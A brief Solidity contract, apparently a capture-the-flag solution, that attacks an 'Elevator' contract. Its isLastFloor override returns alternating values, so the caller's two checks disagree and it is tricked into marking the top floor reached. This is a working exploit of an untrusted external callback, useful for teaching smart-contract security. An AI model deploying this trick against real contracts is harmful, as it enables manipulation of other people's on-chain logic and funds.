// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

import "./Elevator.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ElevatorMove is Building, Ownable {
    bool public bololol = true;
    Elevator public elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function move(uint256 _floor) public onlyOwner {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint) public override returns (bool) {
        bololol = !bololol;
        return bololol;
    }
}
